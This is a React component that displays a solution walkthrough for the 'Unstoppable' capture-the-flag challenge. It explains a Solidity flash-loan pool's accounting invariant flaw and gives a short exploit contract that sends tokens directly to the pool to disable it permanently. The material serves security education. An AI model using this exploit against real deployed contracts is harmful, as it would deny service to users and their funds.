import React from 'react';
import { Accordion, Card, Badge } from 'react-bootstrap';
import { Lock, ChevronDown, AlertTriangle, Target, BookText, Zap, Code } from 'lucide-react';

const DamnUnstoppable = () => {
  return (
    <div className="mb-4">
      <h3 className="d-flex align-items-center gap-2 mb-3">
        <Lock size={20} className="text-muted" />
        Damn Unstoppable CTF Challenge
      </h3>
      
      <Accordion defaultActiveKey="0">
        <Card>
          <Accordion.Header as={Card.Header} className="d-flex justify-content-between align-items-center">
            <div className="d-flex align-items-center gap-2">
              <AlertTriangle size={18} className="text-warning" />
              <strong>View Challenge Solution</strong>
            </div>
            <ChevronDown size={18} />
          </Accordion.Header>
          <Accordion.Body>
            <Card.Body>
              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Target size={18} />
                  Challenge Goal
                </h5>
                <p>Stop the UnstoppableLender contract from offering flash loans.</p>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <BookText size={18} />
                  Initial Setup
                </h5>
                <p>You start with <Badge bg="secondary">100 DVT tokens</Badge> in your wallet.</p>
                <p>The vulnerable contract has two key functions:</p>
                <pre className="bg-light p-3 rounded">
{`function flashLoan(...) external {
  uint256 balanceBefore = token.balanceOf(address(this));
  assert(poolBalance == balanceBefore); // Critical check
  ...
}

function depositTokens(uint256 amount) external {
  require(amount > 0);
  token.transferFrom(msg.sender, address(this), amount);
  poolBalance += amount; // Internal accounting
}`}
                </pre>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <AlertTriangle size={18} className="text-danger" />
                  Core Vulnerability
                </h5>
                <p>The contract maintains two different balance representations:</p>
                <ul>
                  <li><code>poolBalance</code> - Only updated via <code>depositTokens()</code></li>
                  <li><code>token.balanceOf()</code> - Reflects actual token balance</li>
                </ul>
                <p>Direct token transfers to the contract will break the invariant check:</p>
                <pre className="bg-light p-2 rounded">{`assert(poolBalance == balanceBefore);`}</pre>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Zap size={18} className="text-primary" />
                  Exploit Steps
                </h5>
                <ol>
                  <li>Transfer 1 DVT token directly to the pool contract</li>
                  <li>This makes <code>token.balanceOf()</code> exceed <code>poolBalance</code></li>
                  <li>The <code>assert()</code> in <code>flashLoan()</code> will now always fail</li>
                </ol>
                <p>Result: The flash loan functionality is permanently disabled.</p>
              </div>

              <div>
                <h5 className="d-flex align-items-center gap-2">
                  <Code size={18} />
                  Exploit Contract
                </h5>
                <pre className="bg-light p-3 rounded">
{`contract UnstoppableExploit {
  IERC20 public immutable dvt;

  constructor(IERC20 _dvt) {
    dvt = _dvt;
  }

  function attack(address poolAddress, uint256 amount) external {
    dvt.transferFrom(msg.sender, address(this), amount);
    dvt.transfer(poolAddress, amount); // Break invariant
  }
}`}
                </pre>
                <p>Usage: <code>exploit.attack(address(unstoppableLender), 1 ether);</code></p>
              </div>
            </Card.Body>
          </Accordion.Body>
        </Card>
      </Accordion>
    </div>
  );
};

export default DamnUnstoppable;